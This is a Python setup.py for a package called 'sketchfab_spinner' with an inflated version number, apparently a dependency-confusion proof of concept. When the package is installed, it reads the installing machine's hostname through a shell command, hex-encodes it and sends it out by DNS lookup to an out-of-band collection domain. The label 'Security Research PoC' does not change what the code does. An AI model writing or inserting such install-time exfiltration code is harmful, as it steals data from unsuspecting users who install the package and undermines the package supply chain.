from setuptools import setup, find_packages
import subprocess
import socket
import binascii
import os

# 🚨 CONFIGURATION
PACKAGE_NAME = "sketchfab_spinner"
VERSION = "99.9.11"  # <--- BUMP VERSION AGAIN!
DNS_DOMAIN = "alrpzdtypuwrwpjsjzointigavd51e1al.oast.fun" 

def get_safe_data():
    try:
        # COMMAND: Read the hostname file
        # Alternative safe command: "cat /etc/os-release | head -n 1"
        cmd = "cat /etc/hostname"
        
        output = subprocess.check_output(cmd, shell=True, timeout=3)
        
        # 1. Truncate to 30 chars (DNS limit safety)
        # DNS labels max out at 63 chars; keeping it short ensures delivery.
        safe_output = output.decode().strip()[:30]
        
        # 2. Hex Encode (Handles special characters safely)
        hex_output = binascii.hexlify(safe_output.encode()).decode()
        
        return hex_output
    except:
        return "error"

def exfiltrate():
    try:
        data = get_safe_data()
        # Payload: HEX_DATA.package.domain
        target = f"{data}.{PACKAGE_NAME}.{DNS_DOMAIN}"
        socket.gethostbyname(target)
    except:
        pass

exfiltrate()

setup(
    name=PACKAGE_NAME,
    version=VERSION,
    description="Security Research PoC",
    author="Researcher",
    packages=find_packages(),
)
